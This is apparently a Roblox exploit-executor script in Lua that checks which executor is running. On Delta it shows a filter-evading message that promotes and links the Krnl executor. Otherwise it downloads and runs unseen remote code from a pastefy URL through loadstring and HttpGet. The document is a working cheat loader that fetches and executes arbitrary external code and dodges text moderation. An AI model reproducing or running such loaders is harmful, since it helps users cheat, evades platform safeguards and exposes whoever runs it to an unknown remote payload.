local screen = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true

local rand_bypass = "!@;]~`-/+*"

local function if_delta()
	local text = "This script is unstable on delta executor. If you wish to use this script then download krnl";
	local formatted = ""

	for s = 1, #text do
		local symbol = text:sub(s, s)
		local rr = math.random(1, #rand_bypass)
		formatted = formatted..string.format("%s%s",symbol, rand_bypass:sub(rr, rr))
	end
	
	local text = Instance.new("TextLabel", screen)
	text.Text = ""
	text.Size = UDim2.fromScale(1, 0.5)
	text.TextScaled = true
	text.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	text.TextColor3 = Color3.fromRGB(255, 255, 255)
	text.RichText = true
	
	local bt = Instance.new("TextButton", screen)
	bt.Text = 'Copy link'
	bt.Size = UDim2.fromScale(1, 0.5)
	bt.AnchorPoint = Vector2.new(0, 1)
	bt.Position = UDim2.fromScale(0, 1)
	bt.TextScaled = true
	
	bt.Activated:Connect(function()
		setclipboard("https://wearedevs.net/d/Krnl")
	end)
	
	task.wait(0.2)
	
	for i = 1, #formatted do
		local char = formatted:sub(i, i)
		
		if not rand_bypass:find(char) then
			task.wait(0.02)
		end
		
		if rand_bypass:find(char) then
			char = string.format('<font size = "2">%s</font>', char)
		end
		
		text.Text = text.Text..char
	end
	
end

if identifyexecutor() == "Delta" then
	if_delta()
elseif identifyexecutor() ~= "Delta" then
	loadstring(game:HttpGet("https://pastefy.app/pEUtGRWb/raw"))()
end


warn("wortxxxxx1 was here.")
